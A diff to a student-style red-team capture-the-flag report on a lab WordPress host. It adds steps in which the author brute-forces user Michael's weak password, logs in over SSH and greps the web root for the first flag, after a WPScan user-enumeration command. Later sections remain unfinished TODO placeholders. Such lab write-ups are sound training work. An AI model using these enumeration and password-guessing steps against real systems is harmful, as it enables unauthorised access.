@@ -38,6 +38,16 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - WPScan to enumerate users of the targeted WordPress site
       - `$ wpscan --url http://192.168.1.110 --enumerate u`
     - User 'Michael' is our target
+      - Using a brute force attack we are able to guess Michael's very simple password
+      - The users password: michael
+    - Finding 'Flag 1'
+      - `ssh michael@192.168.1.110`
+      - `pwd: michael`
+      - `cd ../../`
+      - `cd var/www/html`
+      - `ls -l`
+      - `grep -i 'flag1' service.html`
+ ![flag1](https://github.com/guerriericp/Final_Project/blob/main/Images/flag_1redteam.png "Flag 1")
   - `flag2.txt`: _TODO: Insert `flag2.txt` hash value_
     - **Exploit Used**
       - _TODO: Identify the exploit used_
